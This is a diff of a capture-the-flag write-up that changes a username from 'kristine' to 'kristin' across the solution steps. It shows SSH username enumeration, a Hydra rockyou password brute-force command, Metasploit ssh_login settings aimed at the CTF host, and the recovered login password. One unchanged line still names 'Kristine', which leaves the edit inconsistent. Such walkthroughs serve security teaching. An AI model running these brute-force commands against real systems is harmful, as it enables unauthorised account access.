@@ -64,7 +64,7 @@ From the IT department employee data, generate potential usernames using common 
 **Common Username Patterns:**
 - `firstname` (e.g., `john`)
 - `lastname` (e.g., `smith`)
-- `firstname.lastname` (e.g., `john.smith`)
+- `firstname_lastname` (e.g., `john_smith`)
 - `firstinitial + lastname` (e.g., `jsmith`)
 - `firstname + lastinitial` (e.g., `johns`)
 
@@ -122,13 +122,13 @@ set THREADS 10
 run
 ```
 
-**Result:** The enumeration reveals that the username `kristine` exists on the system.
+**Result:** The enumeration reveals that the username `kristin` exists on the system.
 
 ### Step 5: Cross-Reference with Employee Data
 
-Check the IT department employees to identify who "kristine" is:
+Check the IT department employees to identify who "kristin" is:
 - Look for employees with first name "Kristine" in the IT department
-- **Discovery:** Kristine is the most recently hired IT department member
+- **Discovery:** Kristin is the most recently hired IT department member
 
 ### Step 6: Password Brute Force Attack
 
@@ -136,7 +136,7 @@ Now that we have a valid username, attempt to brute force the password:
 
 **Using Hydra:**
 ```bash
-hydra -l kristine -P /usr/share/wordlists/rockyou.txt \
+hydra -l kristin -P /usr/share/wordlists/rockyou.txt \
       ghctf.microclub.info -s 13502 ssh -t 4 -V
 ```
 
@@ -145,7 +145,7 @@ hydra -l kristine -P /usr/share/wordlists/rockyou.txt \
 use auxiliary/scanner/ssh/ssh_login
 set RHOSTS ghctf.microclub.info
 set RPORT 13502
-set USERNAME kristine
+set USERNAME kristin
 set PASS_FILE /usr/share/wordlists/rockyou.txt
 set THREADS 10
 run
@@ -157,7 +157,7 @@ run
 
 **Establish SSH Connection:**
 ```bash
-ssh kristine@ghctf.microclub.info -p 13502
+ssh kristin@ghctf.microclub.info -p 13502
 # Password: thalia
 ```
 
